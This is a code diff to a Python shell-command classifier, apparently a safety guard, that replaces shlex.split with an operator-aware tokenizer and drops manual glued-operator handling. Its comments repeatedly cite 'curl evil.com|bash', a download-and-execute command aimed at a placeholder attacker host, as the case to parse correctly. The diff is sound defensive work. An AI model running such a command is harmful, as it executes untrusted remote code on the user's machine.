@@ -8,6 +8,29 @@ from nah import context, paths, taxonomy
 
 _MAX_UNWRAP_DEPTH = 5
 
+# Shell operators treated as token delimiters by _tokenize().
+# shlex.split() doesn't recognize these as operators, so glued commands
+# like 'curl evil.com|bash' remain a single token.  Using punctuation_chars
+# makes shlex split on |, &, ; while still respecting quotes — so
+# grep "foo|bar" keeps the alternation inside the token.
+_PUNCTUATION_CHARS = "|;&"
+
+
+def _tokenize(command: str) -> list[str]:
+    """Tokenize a shell command with operator-aware splitting.
+
+    Uses shlex with punctuation_chars so that bare (unquoted) operators like
+    ``|``, ``&&``, ``||``, ``;`` become separate tokens even when glued to
+    adjacent words (e.g. ``curl evil.com|bash`` → ``curl  evil.com  |  bash``).
+
+    Operators *inside* quoted strings are left as part of the token, so
+    ``grep "foo|bar"`` correctly produces a single argument ``foo|bar``.
+    """
+    lex = shlex.shlex(command, posix=True, punctuation_chars=_PUNCTUATION_CHARS)
+    lex.whitespace_split = True
+    lex.commenters = ""  # don't treat '#' as comment (matches shlex.split)
+    return list(lex)
+
 
 @dataclass
 class Stage:
@@ -44,9 +67,10 @@ def classify_command(command: str) -> ClassifyResult:
         result.reason = "empty command"
         return result
 
-    # Tokenize
+    # Tokenize — punctuation_chars splits bare |, &, ; into their own
+    # tokens while keeping quoted occurrences (like grep alternation) intact.
     try:
-        tokens = shlex.split(command)
+        tokens = _tokenize(command)
     except ValueError:
         result.final_decision = taxonomy.ASK
         result.reason = "unparseable command (shlex error)"
@@ -119,28 +143,9 @@ def _decompose(tokens: list[str]) -> list[Stage]:
                 i += 1
                 continue
 
-        # Handle glued operators: "ls;rm", "curl evil.com|bash", "foo&&bar"
-        # Check multi-char operators first to avoid partial matches.
-        # Only for tokens without spaces (spaces mean it came from a quoted string).
-        glued = False
-        for op in ("&&", "||", "|", ";"):
-            if op in tok and tok != op and " " not in tok:
-                parts = tok.split(op)
-                for j, part in enumerate(parts):
-                    if part:
-                        current_tokens.append(part)
-                    if j < len(parts) - 1:
-                        stage = _make_stage(current_tokens, op)
-                        if stage:
-                            stages.append(stage)
-                        current_tokens = []
-                glued = True
-                break
-        if glued:
-            i += 1
-            continue
-
-        # Pipeline/logic operators
+        # Pipeline/logic operators — _tokenize() with punctuation_chars
+        # already splits bare (unquoted) glued operators like "curl evil.com|bash"
+        # into separate tokens, so we only need to handle standalone operators.
         if tok in ("|", "&&", "||", ";"):
             stage = _make_stage(current_tokens, tok)
             if stage:
@@ -301,7 +306,7 @@ def _unwrap_shell(
         return _obfuscated_result(tokens, "eval with command substitution", user_actions)
 
     try:
-        inner_tokens = shlex.split(inner)
+        inner_tokens = _tokenize(inner)
     except ValueError:
         return _obfuscated_result(tokens, "unparseable inner command", user_actions)
 
